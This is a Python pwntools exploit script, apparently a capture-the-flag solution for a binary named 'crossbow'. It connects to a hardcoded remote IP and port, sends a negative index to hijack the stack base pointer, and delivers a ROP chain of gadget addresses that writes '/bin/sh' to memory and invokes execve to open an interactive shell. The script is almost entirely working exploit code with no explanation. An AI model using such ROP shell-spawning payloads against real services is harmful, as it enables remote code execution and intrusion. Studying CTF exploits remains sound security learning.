from pwn import *
#p = process("./crossbow")
#p = gdb.debug("./crossbow","b *0x4013eb")
p = remote("83.136.251.19",30966)

context.log_level = "debug"
context.arch ="amd64"


rw_page = 0x000000000040d000
binsh = b'/bin/sh' +b'\x00'
rw_page = 0x000000000040d000
syscall = 0x00000000004015d3
pop_rax = 0x0000000000401001
pop_rsp = 0x00000000004018b5
pop_rdi = 0x0000000000401d6c
pop_rsi = 0x000000000040566b
pop_rdx = 0x0000000000401139
ret = 0x0000000000401002
mov_rdi_rax = 0x4020f5
get_shell = p64(ret) + p64(pop_rax) + binsh + p64(pop_rdi)+ p64(rw_page)+ p64(mov_rdi_rax)+ p64(pop_rdx) + p64(0x0) + p64(pop_rsi) + p64(0x0) + p64(pop_rax) + p64(0x3b)+ p64(syscall)

'''
get_shell_payload = flat(
    ret,
    pop_rdi,
    binsh,
    pop_rdx,
    0x0,
    pop_rsi,
    0x0,
    pop_rax,
    0x3b
)
'''
p.sendlineafter("Select target to shoot: ",b'-2') # hijack rbp
p.sendlineafter(">",get_shell)

p.interactive()